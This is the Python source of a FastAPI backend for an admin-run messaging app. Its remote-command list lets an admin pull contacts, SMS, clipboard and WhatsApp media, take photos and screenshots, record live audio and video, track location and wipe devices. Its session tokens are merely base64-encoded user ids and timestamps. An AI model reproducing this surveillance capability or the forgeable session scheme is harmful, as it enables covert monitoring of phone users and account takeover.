"""
FastAPI Mobile Backend with PostgreSQL Database
Updated version that uses PostgreSQL instead of JSON files
"""

import os
import json
import time
import base64
import hashlib
import hmac
import logging
import uuid
from datetime import datetime, timedelta, timezone
from typing import Optional, List, Dict, Any
from contextlib import asynccontextmanager

from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, File, Form, UploadFile, Response, Request, WebSocket, WebSocketDisconnect, Body, Query
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
from fastapi.responses import JSONResponse, FileResponse
import uvicorn
from sqlalchemy.orm import Session
from sqlalchemy import and_, or_

# Import cryptographic libraries
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2
import json

# Import bcrypt for password hashing
import bcrypt

# Load environment variables
if os.path.exists('.env'):
    with open('.env', 'r') as f:
        for line in f:
            if '=' in line and not line.startswith('#'):
                key, value = line.strip().split('=', 1)
                os.environ[key] = value

# Import required modules
from database_config import get_database_session, db_config
from database_models import User, Message, UserKey, UserSession, AuditLog, MasterToken as DBMasterToken, Media, Call, Group, GroupMember, GroupMessageRead, EmergencyAlert, MonitoringConsent, MonitoringSession, AudioRecording, VideoRecording, LocationTrack, DeviceWipeCommand, GeofenceZone, GeofenceEvent, DeadMansSwitch, RemoteCommand, ConferenceSession, ConferenceParticipant, CommandAuditLog, MDMDeviceProfile, LinkedDevice, DeviceLinkRequest
from fake_text_generator import FakeTextGenerator
from watermark_media import apply_watermark
from voice_scrambler import generate_voice_decoy
from decoy_document import generate_decoy_document
from push_notifications import push_to_user

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Security
security = HTTPBearer()

# Password hashing functions
def hash_password(password: str) -> str:
    """Hash a password using bcrypt"""
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    """Verify a password against its hash using bcrypt"""
    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))

# Pydantic Models
class UserAuth(BaseModel):
    username: str = Field(..., min_length=3, max_length=50, description="User's username")
    token: str = Field(..., description="User authentication token")

class UserRegistration(BaseModel):
    """Deprecated - Users can only be created by admin"""
    username: str = Field(..., min_length=3, max_length=50)
    phone_number: str = Field(..., min_length=10, max_length=20, description="User's phone number")
    token: str = Field(..., description="User authentication token")

# Add new Pydantic models for admin functionality
class AdminLogin(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    password: str = Field(..., min_length=8, description="Admin password")

class AdminChangePassword(BaseModel):
    current_password: str = Field(..., description="Current password")
    new_password: str = Field(..., min_length=8, description="New password")

class AdminCreateUser(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    phone_number: str = Field(..., min_length=10, max_length=20, description="User's phone number")
    token: str = Field(..., description="User authentication token")

class AdminUpdateUser(BaseModel):
    username: Optional[str] = Field(None, min_length=3, max_length=50)
    phone_number: Optional[str] = Field(None, min_length=10, max_length=20)
    token: Optional[str] = Field(None)
    is_active: Optional[bool] = Field(None)

class UserLogin(UserAuth):
    pass  # Same as auth - just username and token

class GroupMessageSend(BaseModel):
    group_id: int = Field(..., description="ID of the group to send message to")
    message: str = Field(..., min_length=1, description="Message content")
    addressed_to_username: Optional[str] = Field(None, description="Admin ONLY: Address message to a specific user in the group")
    disappear_after_hours: Optional[int] = Field(None, description="Hours after which message should disappear (default: None)")
    encrypted_key: Optional[str] = Field(None, description="AES key encrypted with RSA (JSON map of username to key for groups)")
    iv: Optional[str] = Field(None, description="Initialization Vector for AES")
    decoy_content: Optional[str] = Field(None, description="Client-generated decoy content")

class MessageSend(BaseModel):
    username: str = Field(..., description="Recipient username")
    message: str = Field(..., min_length=1, description="Message content")
    disappear_after_hours: Optional[int] = Field(None, description="Hours after which message should disappear (default: None)")
    encrypted_key: Optional[str] = Field(None, description="AES key encrypted with recipient RSA public key")
    iv: Optional[str] = Field(None, description="Initialization Vector for AES")
    decoy_content: Optional[str] = Field(None, description="Client-generated decoy content")

class MasterToken(BaseModel):
    mastertoken: str = Field(..., description="Master decryption token")

class DecryptRequest(BaseModel):
    mastertoken: str = Field(..., description="Master token for decryption")
    message_id: int = Field(..., description="ID of the message to decrypt")

class GroupReadReceipt(BaseModel):
    username: str
    read_at: datetime

class MessageResponse(BaseModel):
    id: int
    sender: str
    recipient: str
    content: str
    is_admin_announcement: bool = Field(default=False)
    content_type: str = Field(default="TLS 1.3 + AES-256-GCM + RSA-4096")
    timestamp: datetime
    delivered: bool
    read: bool
    read_by: Optional[List[str]] = []
    read_receipts: Optional[List[GroupReadReceipt]] = []
    server_hmac: bool = Field(default=True, description="Message authentication status")
    decrypt_time: float = Field(default=0.0, description="Time taken to decrypt in seconds")
    decoy_content: Optional[str] = None
    encrypted_key: Optional[str] = None
    iv: Optional[str] = None
    is_private_tagged: Optional[bool] = False
    group_id: Optional[int] = None

class UserResponse(BaseModel):
    username: str
    registered: datetime
    last_login: Optional[datetime]
    is_active: bool

# Add new Pydantic models for media handling
class MediaUpload(BaseModel):
    username: str = Field(..., description="Recipient username")
    media_type: str = Field(..., description="Type of media: photo, video, or document")
    encrypted_content: str = Field(..., description="Base64 encoded encrypted media content")
    filename: str = Field(..., description="Original filename")
    file_size: int = Field(..., description="File size in bytes")
    disappear_after_hours: Optional[int] = Field(None, description="Hours after which media should disappear (default: None)")

class SimpleMediaUpload(BaseModel):
    username: str = Field(..., description="Recipient username")
    media_type: str = Field(default="photo", description="Type of media: photo, video, or document")
    content: str = Field(default="", description="Base64 encoded media content")
    filename: str = Field(default="media", description="Original filename")
    file_size: int = Field(default=0, description="File size in bytes")
    disappear_after_hours: Optional[int] = Field(None, description="Hours after which media should disappear (default: None)")
    content_type: Optional[str] = Field("application/octet-stream", description="MIME type of the media")

class DecoyImageMessage(BaseModel):
    username: str = Field(..., description="Recipient username")
    image_content: str = Field(..., description="Base64 encoded image content")
    filename: str = Field(default="image.jpg", description="Original filename")
    file_size: int = Field(default=0, description="File size in bytes")
    disappear_after_hours: Optional[int] = Field(None, description="Hours after which message should disappear (default: None)")

class DecoyDocumentMessage(BaseModel):
    username: str = Field(..., description="Recipient username")
    document_content: str = Field(..., description="Base64 encoded document content")
    filename: str = Field(..., description="Original filename with extension (e.g., document.pdf, report.docx)")
    file_size: int = Field(default=0, description="File size in bytes")
    mime_type: str = Field(default="application/octet-stream", description="MIME type of the document")
    disappear_after_hours: Optional[int] = Field(None, description="Hours after which message should disappear (default: None)")

class MediaResponse(BaseModel):
    id: int
    media_id: str
    filename: str
    media_type: str
    content_type: str
    file_size: int
    sender: str
    recipient: Optional[str] = None # Optional for group media
    group_id: Optional[int] = None # Added for group media
    timestamp: datetime
    expires_at: Optional[datetime]
    auto_delete: bool
    downloaded: bool

# Group Chat Models
class GroupCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    description: Optional[str] = Field(None, max_length=255)
    members: List[str] = Field(..., description="List of participant usernames")

class AdminGroupUpdate(BaseModel):
    name: Optional[str] = Field(None, min_length=1, max_length=100)
    description: Optional[str] = Field(None, max_length=255)
    members: Optional[List[str]] = Field(None, description="List of participant usernames")

class GroupResponse(BaseModel):
    id: int
    name: str
    description: Optional[str] = None
    created_at: datetime
    created_by: int
    member_count: int

class GroupMemberResponse(BaseModel):
    user_id: int
    username: str
    role: str
    joined_at: datetime



# Monitoring models
class MonitoringConsentRequest(BaseModel):
    consent_given: bool
    allow_live_listen: bool = False
    allow_recording: bool = False
    allow_video_recording: bool = False
    allow_location_tracking: bool = False
    consent_version: str = "1.0"

class LocationPoint(BaseModel):
    latitude: float
    longitude: float
    accuracy: Optional[float] = None
    altitude: Optional[float] = None
    speed: Optional[float] = None
    heading: Optional[float] = None
    activity: Optional[str] = None
    recorded_at: str  # ISO8601 from device clock

class LocationBatch(BaseModel):
    points: List[LocationPoint] = Field(..., description="Batch of GPS points to upload")

# Default 3rd-party app package list cleared under duress_selective wipe when
# a request doesn't specify its own list. Content providers (contacts/SMS/media)
# are always cleared under this mode regardless of this list.
DEFAULT_DURESS_TARGET_PACKAGES = [
    "com.whatsapp",
    "org.telegram.messenger",
    "com.google.android.gm",
    "com.google.android.apps.photos",
    "com.android.chrome",
]

VALID_WIPE_MODES = {"app_data", "duress_selective", "factory_reset"}

class DeviceWipeRequest(BaseModel):
    username: str
    reason: Optional[str] = None
    wipe_mode: str = Field(default="app_data", pattern="^(app_data|duress_selective|factory_reset)$")
    target_packages: Optional[List[str]] = None  # only used for duress_selective; None = server default list

class MassWipeRequest(BaseModel):
    reason: str  # required — mass wipe always needs a stated reason for the audit trail
    usernames: Optional[List[str]] = None  # None = all active users
    wipe_mode: str = Field(default="duress_selective", pattern="^(app_data|duress_selective|factory_reset)$")
    target_packages: Optional[List[str]] = None

class WipeRejectRequest(BaseModel):
    note: Optional[str] = None

class SetWipeApproverRequest(BaseModel):
    username: str
    can_approve: bool

class GeofenceZoneCreate(BaseModel):
    name: str
    center_lat: float
    center_lon: float
    radius_meters: float = Field(..., gt=0)
    alert_on: str = Field(default="both", pattern="^(enter|exit|both)$")
    applies_to: Optional[List[int]] = None  # user_ids; None = all consented

class DeadMansSwitchConfig(BaseModel):
    enabled: bool
    interval_hours: float = Field(default=24.0, gt=0, le=168)
    alert_message: Optional[str] = None

VALID_REMOTE_COMMANDS = {
    "start_audio_recording", "stop_audio_recording",
    "start_video_recording", "stop_video_recording",
    "start_live_audio", "stop_live_audio",
    "start_live_video", "stop_live_video",
    "boost_location_frequency", "normal_location_frequency",
    "panic_mode_on", "panic_mode_off",
    "pull_contacts", "pull_call_logs", "pull_sms", "pull_media", "pull_all",
    "pull_installed_apps", "pull_whatsapp_media",
    "start_screen_record", "stop_screen_record",
    "take_photo",
    "get_battery_status", "get_network_info", "get_device_info",
    "get_clipboard", "capture_screenshot",
    "start_screenshot_timer", "stop_screenshot_timer",
}

class RemoteCommandRequest(BaseModel):
    username: str
    command_type: str
    params: Optional[Dict] = None  # e.g. {"chunk_seconds": 30, "quality": "medium"}
    device_id: Optional[str] = None  # None = send to all devices for this user

class RemoteCommandAck(BaseModel):
    command_id: int
    status: str  # "executing" or "done" or "failed"

class MonitoringSessionRequest(BaseModel):
    target_username: str = Field(..., description="Username of user admin wants to listen to")
    offer_sdp: Optional[str] = Field(None, description="WebRTC offer SDP from admin")

class MonitoringSessionAction(BaseModel):
    session_id: int
    action: str = Field(..., pattern="^(accept|reject|end)$")
    answer_sdp: Optional[str] = Field(None, description="WebRTC answer SDP (required for accept)")

class MonitoringIceCandidate(BaseModel):
    session_id: int
    candidate: Dict

# Emergency alert models
class EmergencyTriggerRequest(BaseModel):
    latitude: Optional[float] = Field(None, description="GPS latitude")
    longitude: Optional[float] = Field(None, description="GPS longitude")
    accuracy: Optional[float] = Field(None, description="GPS accuracy in meters")
    location_name: Optional[str] = Field(None, description="Human-readable location label")
    message: Optional[str] = Field(None, description="Optional context message from user")
    alert_type: str = Field(default="panic", pattern="^(panic|medical|threat)$")
    device_info: Optional[Dict] = Field(None, description="Battery level, network, etc.")
    trigger_wipe: bool = Field(default=False, description="User is self-initiating a duress wipe of their own device along with this alert")

class EmergencyAcknowledgeRequest(BaseModel):
    alert_id: int
    note: Optional[str] = Field(None, description="Admin note on acknowledgement")

class EmergencyResolveRequest(BaseModel):
    alert_id: int
    note: Optional[str] = Field(None, description="Admin resolution note")

# Call signaling models
class CallRequest(BaseModel):
    recipient_username: str = Field(..., description="Username of the person to call")
    call_type: str = Field(..., pattern="^(voice|video)$", description="Type of call: voice or video")
    offer_sdp: Optional[str] = Field(None, description="WebRTC offer SDP")

class CallAction(BaseModel):
    call_id: int = Field(..., description="ID of the call")
    action: str = Field(..., pattern="^(accept|decline|end|busy|ringing)$", description="Action to perform on the call")
    answer_sdp: Optional[str] = Field(None, description="WebRTC answer SDP (required for accept)")
    mastertoken: Optional[str] = Field(None, description="Master token for authorization (required for accept)")

class IceCandidatePayload(BaseModel):
    call_id: int = Field(..., description="ID of the call")
    recipient_username: str = Field(..., description="Who to send this candidate to")
    candidate: Dict = Field(..., description="The ICE candidate object")

# validate_master_token() is defined at module scope further below
# (after AuditService), alongside the decoy-extraction helpers.

# Database Services
class UserService:
    """Service class for user operations"""
    
    @staticmethod
    def create_user(db: Session, user_data: UserRegistration, ip_address: Optional[str] = None) -> User:
        """Create a new user - DEPRECATED: Only admin can create users now"""
        raise HTTPException(
            status_code=403, 
            detail="User registration is disabled. Only administrators can create user accounts."
        )
    
    @staticmethod
    def authenticate_user(db: Session, phone_number: str, token: str, ip_address: Optional[str] = None) -> Optional[User]:
        """Authenticate user with phone number and token, update last login"""
        user = db.query(User).filter(
            User.phone_number == phone_number, 
            User.token == token,
            User.is_active == True
        ).first()
        
        if user:
            # Use setattr for SQLAlchemy models
            setattr(user, 'last_login', datetime.now(timezone.utc))
            db.commit()
            
            # Log login
            AuditService.log_event(
                db, getattr(user, 'id', None), "user_login", 
                f"User {phone_number} logged in", 
                ip_address=ip_address
            )
        
        return user
    
    @staticmethod
    def get_user_by_phone(db: Session, phone_number: str) -> Optional[User]:
        """Get user by phone number"""
        return db.query(User).filter(User.phone_number == phone_number, User.is_active == True).first()
    
    @staticmethod
    def get_user_by_username(db: Session, username: str) -> Optional[User]:
        """Get user by username - deprecated, kept for backward compatibility"""
        return db.query(User).filter(User.username == username, User.is_active == True).first()
    
    @staticmethod
    def get_all_users(db: Session) -> List[User]:
        """Get all active users"""
        return db.query(User).filter(User.is_active == True).all()
    
    @staticmethod
    def delete_user(db: Session, phone_number: str) -> bool:
        """Delete a user account and all associated data - DEPRECATED: Use AdminService.delete_user"""
        raise HTTPException(
            status_code=403,
            detail="Only administrators can delete user accounts."
        )

class MessageService:
    """Service class for message operations"""
    
    @staticmethod
    def send_message_by_username(db: Session, sender_id: int, recipient_username: str, message_content: str, disappear_after_hours: Optional[int] = 12, encrypted_key: Optional[str] = None, iv: Optional[str] = None, decoy_content: Optional[str] = None) -> Message:
        """Send a message to a specific user by username"""
        recipient = db.query(User).filter(User.username == recipient_username, User.is_active == True).first()
        if not recipient:
            raise HTTPException(status_code=404, detail="Recipient not found")
        
        decoy_text = decoy_content if decoy_content else FakeTextGenerator.generate_decoy_text_for_message(message_content)

        expires_at = None
        auto_delete = False
        if disappear_after_hours is not None and disappear_after_hours > 0:
            expires_at = datetime.now(timezone.utc) + timedelta(hours=disappear_after_hours)
            auto_delete = True
        
        message = Message(
            sender_id=sender_id,
            recipient_id=recipient.id,
            encrypted_content=message_content,
            content_type="encrypted",
            delivered=False,
            read=False,
            is_offline=True,
            expires_at=expires_at,
            auto_delete=auto_delete,
            decoy_content=decoy_text,
            encrypted_key=encrypted_key,
            iv=iv
        )
        
        db.add(message)
        db.commit()
        db.refresh(message)
        return message

    @staticmethod
    def send_message_to_group(db: Session, sender_id: int, group_id: int, message_content: str,
                             disappear_after_hours: Optional[int] = 12,
                             addressed_to_id: Optional[int] = None,
                             is_admin_announcement: bool = False,
                             encrypted_key: Optional[str] = None,
                             iv: Optional[str] = None,
                             decoy_content: Optional[str] = None) -> Message:
        """Send a message to a group"""
        # Verify sender is a member
        membership = db.query(GroupMember).filter(
            GroupMember.group_id == group_id, 
            GroupMember.user_id == sender_id
        ).first()
        if not membership:
            raise HTTPException(status_code=403, detail="You are not a member of this group")
            
        decoy_text = decoy_content if decoy_content else FakeTextGenerator.generate_decoy_text_for_message(message_content)

        expires_at = None
        auto_delete = False
        if disappear_after_hours and disappear_after_hours > 0:
            expires_at = datetime.now(timezone.utc) + timedelta(hours=disappear_after_hours)
            auto_delete = True
            
        message = Message(
            sender_id=sender_id,
            group_id=group_id,
            recipient_id=addressed_to_id,
            encrypted_content=message_content,
            content_type="encrypted",
            is_admin_announcement=is_admin_announcement,
            delivered=True,
            read=False,
            expires_at=expires_at,
            auto_delete=auto_delete,
            decoy_content=decoy_text,
            encrypted_key=encrypted_key,
            iv=iv
        )
        
        db.add(message)
        db.commit()
        db.refresh(message)
        return message
    
    @staticmethod
    def get_user_messages(db: Session, user_id: int, limit: int = 50) -> List[Message]:
        """Get all messages for a user (direct and group)"""
        # Get IDs of groups the user is in
        group_ids = [m.group_id for m in db.query(GroupMember.group_id).filter(GroupMember.user_id == user_id).all()]
        
        return db.query(Message).filter(
            or_(
                Message.recipient_id == user_id,
                Message.sender_id == user_id,
                Message.group_id.in_(group_ids) if group_ids else False
            )
        ).order_by(Message.timestamp.desc()).limit(limit).all()
    
    @staticmethod
    def get_offline_messages(db: Session, user_id: int) -> List[Message]:
        """Get offline messages for a user"""
        return db.query(Message).filter(
            and_(
                Message.recipient_id == user_id,
                Message.is_offline == True,
                Message.delivered == False
            )
        ).order_by(Message.timestamp.asc()).all()
    
    @staticmethod
    def mark_message_delivered(db: Session, message_id: int) -> bool:
        """Mark message as delivered"""
        message = db.query(Message).filter(Message.id == message_id).first()
        if message:
            setattr(message, 'delivered', True)
            setattr(message, 'is_offline', False)
            db.commit()
            return True
        return False
    
    @staticmethod
    def mark_message_read(db: Session, message_id: int) -> bool:
        """Mark message as read"""
        message = db.query(Message).filter(Message.id == message_id).first()
        if message:
            setattr(message, 'read', True)
            setattr(message, 'read_timestamp', datetime.now(timezone.utc))
            db.commit()
            return True
        return False

    @staticmethod
    def delete_expired_messages(db: Session) -> int:
        """Delete expired messages and return count of deleted messages"""
        current_time = datetime.now(timezone.utc)
        expired_messages = db.query(Message).filter(
            and_(
                Message.auto_delete == True,
                Message.expires_at <= current_time
            )
        ).all()

        deleted_count = len(expired_messages)

        for message in expired_messages:
            db.delete(message)

        if deleted_count > 0:
            db.commit()
            logger.info(f"🗑️  Deleted {deleted_count} expired messages")

        return deleted_count

class GroupService:
    """Service class for group operations"""
    
    @staticmethod
    def create_group(db: Session, creator_id: int, name: str, description: Optional[str], member_usernames: List[str]) -> Group:
        """Create a new group and add initial members"""
        group = Group(name=name, description=description, created_by=creator_id)
        db.add(group)
        db.commit()
        db.refresh(group)
        
        # Add creator as admin
        creator_member = GroupMember(group_id=group.id, user_id=creator_id, role="admin")
        db.add(creator_member)
        
        # Add other members
        for username in member_usernames:
            user = db.query(User).filter(User.username == username, User.is_active == True).first()
            if user and user.id != creator_id:
                member = GroupMember(group_id=group.id, user_id=user.id, role="member")
                db.add(member)
        
        db.commit()
        db.refresh(group)
        
        # Send notification message in the group
        creator = db.query(User).filter(User.id == creator_id).first()
        creator_name = str(getattr(creator, 'username', 'Admin'))
        now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M")
        
        notification_text = f"📢 Group '{name}' created by {creator_name}.\nWelcome all members! (Created on {now_str})"
        MessageService.send_message_to_group(db, creator_id, group.id, notification_text, is_admin_announcement=True)
        
        AuditService.log_event(db, creator_id, "group_created", f"Group '{name}' created with ID {group.id}")
        return group
    
    @staticmethod
    def get_user_groups(db: Session, user_id: int) -> List[Group]:
        """Get all groups a user belongs to"""
        return db.query(Group).join(GroupMember).filter(GroupMember.user_id == user_id).all()
        
    @staticmethod
    def get_group_members(db: Session, group_id: int) -> List[Dict]:
        """Get all members of a group with their usernames"""
        members = db.query(GroupMember, User.username).join(User, GroupMember.user_id == User.id).filter(GroupMember.group_id == group_id).all()
        return [{"user_id": m[0].user_id, "username": m[1], "role": m[0].role, "joined_at": m[0].joined_at} for m in members]

    @staticmethod
    def add_member(db: Session, group_id: int, username: str, actor_id: int) -> bool:
        """Add a member to a group (must be an admin or the group creator)"""
        # Check permissions
        actor_member = db.query(GroupMember).filter(GroupMember.group_id == group_id, GroupMember.user_id == actor_id).first()
        if not actor_member or actor_member.role != "admin":
            raise HTTPException(status_code=403, detail="Only admins can add members")
            
        user = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
            
        # Check if already a member
        existing = db.query(GroupMember).filter(GroupMember.group_id == group_id, GroupMember.user_id == user.id).first()
        if existing:
            return True
            
        member = GroupMember(group_id=group_id, user_id=user.id)
        db.add(member)
        db.commit()
        
        # Send notification message
        actor = db.query(User).filter(User.id == actor_id).first()
        actor_name = str(getattr(actor, 'username', 'Admin'))
        now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M")
        
        group = db.query(Group).filter(Group.id == group_id).first()
        group_name = str(getattr(group, 'name', 'this group'))
        
        notification_text = f"👤 {username} has been added to '{group_name}' by {actor_name}.\nJoin date: {now_str}"
        MessageService.send_message_to_group(db, actor_id, group_id, notification_text, addressed_to_id=user.id, is_admin_announcement=True)
        
        # Send a private DM notification as well
        dm_text = f"👋 Hello! I've added you to the group '{group_name}'. You can find it in your Groups tab."
        recipient_username = str(getattr(user, 'username', ''))
        MessageService.send_message_by_username(db, actor_id, recipient_username, dm_text)
        
        return True

    @staticmethod
    def leave_group(db: Session, group_id: int, user_id: int) -> bool:
        """Allow a user to leave a group"""
        membership = db.query(GroupMember).filter(GroupMember.group_id == group_id, GroupMember.user_id == user_id).first()
        if not membership:
            return False
            
        # Log before deletion
        user = db.query(User).filter(User.id == user_id).first()
        username = str(getattr(user, 'username', 'User'))
        
        db.delete(membership)
        db.commit()
        
        # Send notification message (using system/ghost sender if possible, otherwise use user_id before deletion? No, user is gone from members).
        # We can use the user_id even if they left.
        now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M")
        notification_text = f"🚪 {username} has left the group.\nDate: {now_str}"
        # We try to send this message. 
        # Note: if it's the last member, this might be weird but fine.
        try:
            MessageService.send_message_to_group(db, user_id, group_id, notification_text)
        except:
            pass
            
        AuditService.log_event(db, user_id, "group_leave", f"User {username} left group {group_id}")
        return True

    @staticmethod
    def delete_group(db: Session, group_id: int, creator_id: int) -> bool:
        """Delete a group and its messages/members (admin only)"""
        group = db.query(Group).filter(Group.id == group_id).first()
        if not group:
            return False
            
        # Delete messages in the group
        db.query(Message).filter(Message.group_id == group_id).delete()
        
        # Delete media in the group
        db.query(Media).filter(Media.group_id == group_id).delete()
        
        # Delete members
        db.query(GroupMember).filter(GroupMember.group_id == group_id).delete()
        
        # Delete group
        db.delete(group)
        db.commit()
        
        AuditService.log_event(db, creator_id, "group_deleted", f"Group ID {group_id} deleted by admin")
        return True

    @staticmethod
    def update_group(db: Session, group_id: int, name: Optional[str], description: Optional[str], member_usernames: Optional[List[str]], actor_id: int) -> bool:
        """Update group details and membership (admin only)"""
        group = db.query(Group).filter(Group.id == group_id).first()
        if not group:
            return False
            
        if name:
            group.name = name
        if description is not None:
            group.description = description
            
        if member_usernames is not None:
            # Sync members: remove existing, add new list
            # Skip creator preservation if admin is doing the sync, unless desired
            db.query(GroupMember).filter(GroupMember.group_id == group_id).delete()
            
            # Re-add members from the new list
            for username in member_usernames:
                user = db.query(User).filter(User.username == username, User.is_active == True).first()
                if user:
                    # Check if they were already added in this loop (usernames might not be unique in input)
                    existing = db.query(GroupMember).filter(GroupMember.group_id == group_id, GroupMember.user_id == user.id).first()
                    if not existing:
                        role = "admin" if user.id == group.created_by else "member"
                        member = GroupMember(group_id=group_id, user_id=user.id, role=role)
                        db.add(member)
            
        db.commit()
        AuditService.log_event(db, actor_id, "group_updated", f"Group '{group.name}' (ID {group_id}) updated by admin")
        return True

    @staticmethod
    def get_all_groups(db: Session) -> List[Group]:
        """Get all groups (admin only)"""
        return db.query(Group).all()
    
class SessionService:
    """Service class for session management"""
    
    @staticmethod
    def create_session(db: Session, user_id: int, session_type: str = "api", ip_address: Optional[str] = None) -> UserSession:
        """Create a new session"""
        # Generate session token
        session_data = f"{user_id}:{int(time.time())}:{session_type}"
        session_token = base64.b64encode(session_data.encode()).decode()
        
        # Set expiration (24 hours)
        expires_at = datetime.now(timezone.utc) + timedelta(hours=24)
        
        session = UserSession(
            user_id=user_id,
            session_token=session_token,
            session_type=session_type,
            expires_at=expires_at,
            ip_address=ip_address,
            is_active=True
        )
        
        db.add(session)
        db.commit()
        db.refresh(session)
        
        return session
    
    @staticmethod
    def validate_session(db: Session, session_token: str) -> Optional[UserSession]:
        """Validate a session token"""
        session = db.query(UserSession).filter(
            and_(
                UserSession.session_token == session_token,
                UserSession.is_active == True,
                UserSession.expires_at > datetime.now(timezone.utc)
            )
        ).first()
        
        if session:
            # Update last activity
            setattr(session, 'last_activity', datetime.now(timezone.utc))
            db.commit()
        
        return session
    
    @staticmethod
    def invalidate_session(db: Session, session_token: str) -> bool:
        """Invalidate a session (logout)"""
        session = db.query(UserSession).filter(UserSession.session_token == session_token).first()
        if session:
            setattr(session, 'is_active', False)
            setattr(session, 'logout_reason', "manual")
            db.commit()
            return True
        return False

class AuditService:
    """Service class for audit logging"""
    
    @staticmethod
    def log_event(db: Session, user_id: Optional[int], event_type: str, description: str, 
                  severity: str = "info", ip_address: Optional[str] = None, extra_data: Optional[Dict[Any, Any]] = None):
        """Log an audit event"""
        audit_log = AuditLog(
            user_id=user_id,
            event_type=event_type,
            event_description=description,
            severity=severity,
            ip_address=ip_address,
            extra_data=extra_data or {}  # Fix the None default
        )
        
        db.add(audit_log)
        db.commit()

# ── Master-token validation + decoy extraction ───────────────────────────────
# E2EE moved message decryption to the client; these helpers survive because
# they are used by master-token gating and the hidden image/document decoys.
# (Kept module-level after DecryptService was removed.)

def validate_master_token(db: Session, user_id: int, mastertoken: str) -> bool:
    """Validate the master token for a user (constant-time hash compare)."""
    try:
        if not mastertoken:
            return False

        record = db.query(DBMasterToken).filter(
            DBMasterToken.user_id == user_id,
            DBMasterToken.is_active == True
        ).order_by(DBMasterToken.created_at.desc()).first()

        if not record:
            return False

        expires_at = getattr(record, "expires_at", None)
        if expires_at is not None:
            now = datetime.now(timezone.utc)
            if getattr(expires_at, "tzinfo", None) is None:
                expires_at = expires_at.replace(tzinfo=timezone.utc)
            if expires_at <= now:
                return False

        salt = str(getattr(record, "salt", ""))
        expected_hash = str(getattr(record, "token_hash", ""))
        if not salt or not expected_hash:
            return False

        provided_hash = hashlib.sha256((mastertoken + salt).encode()).hexdigest()
        return hmac.compare_digest(provided_hash, expected_hash)
    except Exception as e:
        logger.error(f"Master token validation error: {e}")
        return False


def extract_decoy_image(message_content: str) -> Optional[Dict]:
    """Extract a hidden image payload embedded in decoy message content."""
    try:
        import re
        match = re.search(r'\[IMAGE_DATA:([^\]]+)\]', message_content)
        if not match:
            return None
        decoded_json = base64.b64decode(match.group(1)).decode()
        image_payload = json.loads(decoded_json)
        if image_payload.get("type") != "decoy_image":
            return None
        return {
            "image_data": image_payload.get("image_data", ""),
            "filename": image_payload.get("filename", "image.jpg"),
            "file_size": image_payload.get("file_size", 0),
            "timestamp": image_payload.get("timestamp", 0),
        }
    except Exception as e:
        logger.error(f"Error extracting decoy image: {e}")
        return None


def extract_decoy_document(message_content: str) -> Optional[Dict]:
    """Extract a hidden document payload embedded in decoy message content."""
    try:
        import re
        match = re.search(r'\[DOCUMENT_DATA:([^\]]+)\]', message_content)
        if not match:
            return None
        decoded_json = base64.b64decode(match.group(1)).decode()
        document_payload = json.loads(decoded_json)
        if document_payload.get("type") != "decoy_document":
            return None
        return {
            "document_data": document_payload.get("document_data", ""),
            "filename": document_payload.get("filename", "document"),
            "file_size": document_payload.get("file_size", 0),
            "mime_type": document_payload.get("mime_type", "application/octet-stream"),
            "timestamp": document_payload.get("timestamp", 0),
        }
    except Exception as e:
        logger.error(f"Error extracting decoy document: {e}")
        return None


class MediaService:
    """Service class for media operations"""
    
    @staticmethod
    def upload_media(db: Session, sender_id: int, recipient_username: str, media_data: dict) -> Media:
        """Upload encrypted media file (photo, video, or document)"""
        return MediaService.upload_media_by_username(db, sender_id, recipient_username, media_data)
    
    @staticmethod
    def upload_media_by_username(db: Session, sender_id: int, recipient_username: str, media_data: dict) -> Media:
        """Upload encrypted media file (photo, video, or document) by username"""
        # Get recipient by username
        recipient = db.query(User).filter(User.username == recipient_username, User.is_active == True).first()
        if not recipient:
            raise HTTPException(status_code=404, detail="Recipient not found")
        
        # Generate unique media ID
        import uuid
        media_id = str(uuid.uuid4())
        
        # Save encrypted media to file system
        import os
        upload_dir = "media_uploads"
        if not os.path.exists(upload_dir):
            os.makedirs(upload_dir)
        
        # Save encrypted content to file
        encrypted_file_path = os.path.join(upload_dir, f"{media_id}.enc")
        try:
            # Decode base64 content and save to file
            import base64
            encrypted_content = base64.b64decode(media_data["encrypted_content"])
            with open(encrypted_file_path, "wb") as f:
                f.write(encrypted_content)
        except Exception as e:
            logger.error(f"Error saving encrypted media: {e}")
            raise HTTPException(status_code=500, detail="Failed to save encrypted media")
        
        # Calculate expiration time if disappearing media
        expires_at = None
        auto_delete = False
        if media_data.get("disappear_after_hours") is not None and media_data["disappear_after_hours"] > 0:
            from datetime import datetime, timedelta, timezone
            expires_at = datetime.now(timezone.utc) + timedelta(hours=media_data["disappear_after_hours"])
            auto_delete = True
        
        # Create message for the media
        message = Message(
            sender_id=sender_id,
            recipient_id=recipient.id,
            encrypted_content=media_data["encrypted_content"],
            content_type=f"media/{media_data['media_type']}",
            delivered=False,
            read=False,
            is_offline=True,
            expires_at=expires_at,
            auto_delete=auto_delete
        )
        
        db.add(message)
        db.commit()
        db.refresh(message)
        
        # Create media record
        media = Media(
            media_id=media_id,
            filename=media_data["filename"],
            file_size=media_data["file_size"],
            media_type=media_data["media_type"],
            content_type=media_data.get("content_type", "application/octet-stream"),
            encryption_metadata=media_data.get("encryption_metadata"),
            encrypted_file_path=encrypted_file_path,
            message_id=message.id,
            sender_id=sender_id,
            recipient_id=recipient.id,
            expires_at=expires_at,
            auto_delete=auto_delete
        )
        
        db.add(media)
        db.commit()
        db.refresh(media)
        
